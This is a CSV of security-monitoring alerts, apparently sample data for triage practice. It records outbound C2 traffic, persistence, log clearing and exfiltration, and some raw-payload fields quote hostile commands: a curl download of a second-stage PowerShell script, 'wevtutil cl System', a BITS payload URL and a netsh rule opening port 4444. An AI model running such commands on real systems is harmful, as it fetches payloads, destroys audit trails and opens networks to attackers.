alert_id,timestamp,source_ip,destination_ip,destination_port,alert_name,severity,category,rule_id,asset_tags,raw_payload,analyst_notes
ALERT-016,2026-04-03T16:44:55Z,10.0.2.25,45.155.205.233,4444,Suspicious outbound port 4444,high,c2,C2-002,"workstation,endpoint",{"proto":"tcp","bytes":1200},"Metasploit default listener port"
ALERT-017,2026-04-04T09:12:06Z,10.0.1.22,10.0.1.1,135,Service installed outside patch window,high,malware,PERSIST-002,server,{"service":"RemoteAccessSvc","binary":"C:\\Temp\\svc.exe"},"Binary in Temp; no change ticket"
ALERT-018,2026-04-04T10:55:38Z,10.0.1.18,10.0.1.5,445,Registry run key persistence,high,malware,PERSIST-003,server,{"key":"HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run","value":"C:\\Users\\Public\\update.exe"},""
ALERT-019,2026-04-03T08:30:00Z,10.0.3.10,10.0.1.0,0,Port scan from internal host,medium,recon,RECON-002,"workstation,endpoint",{"ports_scanned":512,"target":"10.0.1.0/24"},"Internal sweep; possibly misconfigured scanner"
ALERT-020,2026-04-03T08:55:22Z,10.0.3.15,10.0.1.5,22,Multiple failed authentications,medium,malware,BF-002,workstation,{"failed_logins":45,"window_sec":120},""
ALERT-021,2026-04-03T09:20:44Z,10.0.3.20,198.98.56.76,443,Unusual outbound traffic volume,medium,data_exfil,EXFIL-002,"workstation,endpoint",{"bytes_out":52428800,"threshold":10485760},"5x normal baseline"
ALERT-022,2026-04-03T09:48:11Z,10.0.3.25,10.0.1.0,445,SMB scanning from workstation,medium,recon,RECON-003,"workstation,endpoint",{"hosts_scanned":64},""
ALERT-023,2026-04-03T10:33:55Z,10.0.3.30,10.0.1.10,0,New service binary,medium,malware,PERSIST-004,"workstation,endpoint",{"binary":"C:\\Windows\\Temp\\helper.exe","signed":false},""
ALERT-024,2026-04-03T11:15:37Z,10.0.3.35,10.0.1.12,0,Unusual parent-child process,medium,malware,PROC-001,"workstation,endpoint",{"parent":"winword.exe","child":"cmd.exe"},"Office macro spawning shell"
ALERT-025,2026-04-03T12:02:19Z,10.0.3.40,10.0.1.1,0,USB device plugged in restricted zone,medium,other,USB-001,"workstation,endpoint",{"device":"Kingston DataTraveler","zone":"finance"},"Policy violation in restricted area"
ALERT-026,2026-04-03T13:27:01Z,10.0.3.45,10.0.1.5,0,Clear event logs command,medium,malware,LOG-001,"workstation,endpoint",{"cmdline":"wevtutil cl System"},"Clearing Security and System event logs"
ALERT-027,2026-04-03T14:44:43Z,10.0.3.50,10.0.1.1,443,BITS job created,medium,malware,BITS-001,"workstation,endpoint",{"url":"http://185.220.101.47/payload","size":2048000},"BITS used to download from external host"
ALERT-028,2026-04-03T15:59:25Z,10.0.3.55,10.0.1.1,0,Netsh firewall rule change,medium,malware,FW-001,"workstation,endpoint",{"rule":"allow any any 4444"},"Firewall opened for all traffic on 4444"
ALERT-029,2026-04-03T16:38:07Z,10.0.3.60,192.168.100.20,445,Large file moved to external share,medium,data_exfil,EXFIL-003,"workstation,endpoint",{"file":"contracts_2026.zip","size_mb":240},"240 MB archive to unmanaged share"
ALERT-030,2026-04-04T08:11:49Z,10.0.3.65,10.0.1.1,0,Python script executed on workstation,medium,malware,SCRIPT-001,"workstation,endpoint",{"script":"C:\\Users\\Public\\harvest.py","user":"bwilliams"},"Script reads browser credential stores"
ALERT-031,2026-04-04T09:29:31Z,10.0.3.70,91.108.4.0,80,wget/curl on Windows host,medium,c2,C2-003,"workstation,endpoint",{"cmdline":"curl http://91.108.4.0/stage2.ps1 -o C:\\Temp\\s.ps1"},"Second-stage download attempt"
ALERT-032,2026-04-04T11:47:13Z,10.0.3.75,10.0.1.5,3389,Remote desktop login outside hours,medium,lateral_movement,RDP-001,"workstation,endpoint",{"user":"admin","login_time":"02:17","expected_hours":"08:00-18:00"},"RDP at 02:17 from jump host"
ALERT-033,2026-04-05T08:02:55Z,192.168.10.5,10.0.1.1,0,Port scan to internal IP,low,recon,RECON-004,endpoint,{"target":"10.0.1.1","ports":65535},"Full port scan against domain controller"
ALERT-034,2026-04-03T07:15:00Z,192.168.1.100,10.0.1.1,0,Antivirus definition update failed,low,other,AV-001,"workstation,endpoint",{"av_product":"Defender","last_update":"2026-03-28"},""
ALERT-035,2026-04-03T07:45:33Z,192.168.1.101,10.0.1.1,514,Log source went silent 15min,low,other,LOG-002,server,{"log_source":"firewall-01","silent_since":"2026-04-03T07:30:00Z"},""
ALERT-036,2026-04-03T14:22:10Z,192.168.1.102,192.168.1.1,0,User login from new device,low,other,AUTH-001,endpoint,{"user":"cjones","device_id":"LAPTOP-9X72K","first_seen":true},""
ALERT-037,2026-04-04T07:58:44Z,192.168.1.103,10.0.1.1,0,Scheduled task modified,low,other,PERSIST-005,endpoint,{"task_name":"Adobe Update","modified_by":"asmith"},""
ALERT-038,2026-04-04T10:30:17Z,192.168.1.104,10.0.1.1,0,Browser extension installed,low,other,EXT-001,"workstation,endpoint",{"extension":"Free VPN Proxy","browser":"Chrome","user":"dlee"},""
ALERT-039,2026-04-04T13:05:52Z,192.168.1.105,10.0.1.1,0,Screensaver disabled on workstation,low,other,POL-001,workstation,{"user":"mthomas","policy_violated":"CIS-2.3.1"},""
ALERT-040,2026-04-05T09:33:26Z,192.168.1.106,10.0.1.5,22,Multiple login attempts same user,low,other,AUTH-002,endpoint,{"user":"rwhite","attempts":8,"window_min":5},""
